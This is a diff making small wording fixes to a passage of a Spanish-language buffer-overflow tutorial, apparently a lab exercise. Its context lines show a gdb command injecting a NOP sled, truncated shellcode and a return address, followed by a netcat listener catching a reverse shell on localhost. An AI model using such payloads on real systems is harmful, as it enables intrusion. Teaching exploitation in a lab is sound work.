@@ -555,10 +555,6 @@ Después de iniciar nuestro `netcat`oyente, ejecutamos nuevamente nuestro explo
 (gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
 ```
 
-#### Netcat - Escucha de shell inversa
-
-  Identificación de la dirección de devolución
-
 ```shell-session
 Listening on [0.0.0.0] (family 0, port 31337)
 Connection from 127.0.0.1 33504 received!
@@ -568,7 +564,7 @@ id
 uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
 ```
 
-Ahora vemos que obtuvimos una conexión desde la dirección IP local. Sin embargo, no es obvio si tenemos un shell. Por lo tanto, escribimos el comando " `id`" para obtener más información sobre el usuario. Si obtenemos un valor de retorno con información, sabemos que estamos en un shell, como se muestra en el ejemplo.
+Ahora vemos que obtuvimos una conexión desde la dirección IP local. Sin embargo, no es obvio si tenemos un shell. Por lo tanto, escribimos el comando "`id`" para obtener más información sobre el usuario. Si obtenemos un valor de retorno con información, sabemos que estamos en un shell, como se muestra en el ejemplo.
 
 
 
